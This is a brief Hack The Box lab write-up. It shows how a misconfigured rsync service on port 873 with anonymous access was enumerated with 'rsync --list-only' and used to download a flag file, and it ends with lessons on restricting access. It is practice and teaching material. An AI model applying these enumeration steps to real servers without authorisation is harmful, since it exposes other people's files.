# HTB Machine: Machine-Name  
**Date Completed:** 02/13/2025
🔹**Difficulty:** Easy 
🔹**OS:** Linux 
🔹**Objective:** 
Exploit misconfigured rsync to retrieve a flag 




##  Steps for objective 
🔹 Nmap Scan: Found rsync (port 873) open with anonymous access enabled.
🔹 Listed available directories:

Scanned the target and found rsync (port 873) open with anonymous access enabled.
Listed available directories:

rsync --list-only {target_IP}::
Found a public directory with open access.
 
Exploitation
Listed files in the public directory:
rsync --list-only {target_IP}::public

Found flag.txt.
Downloaded and read the flag:
rsync {target_IP}::public/flag.txt .
cat flag.txt
Successfully retrieved the flag! 

Lessons Learned:
Misconfigured rsync can expose sensitive files.
Anonymous access should always be restricted.

